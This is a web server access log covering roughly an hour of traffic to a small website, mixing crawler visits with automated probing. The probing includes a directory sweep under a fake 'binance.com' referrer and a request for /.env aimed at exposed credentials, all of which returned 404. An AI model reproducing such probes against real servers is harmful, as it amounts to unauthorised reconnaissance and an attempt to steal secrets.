::ffff:46.161.11.227 - - [20/Aug/2022:17:18:40 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:17:18:40 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:05 +0000] "GET /wp-admin/css/ HTTP/1.1" 404 152 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:16 +0000] "GET /.well-known/ HTTP/1.1" 404 151 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:26 +0000] "GET /sites/default/files/ HTTP/1.1" 404 159 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:38 +0000] "GET /admin/controller/extension/extension/ HTTP/1.1" 404 176 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:49 +0000] "GET /uploads/ HTTP/1.1" 404 147 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:35:59 +0000] "GET /images/ HTTP/1.1" 404 146 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:20.127.196.24 - - [20/Aug/2022:17:36:10 +0000] "GET /files/ HTTP/1.1" 404 145 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:99.167.203.90 - - [20/Aug/2022:17:37:13 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:157.55.39.245 - - [20/Aug/2022:17:59:56 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.74 - - [20/Aug/2022:18:08:30 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [20/Aug/2022:18:09:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:18:09:24 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.23 - - [20/Aug/2022:18:11:53 +0000] "GET /instructors.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
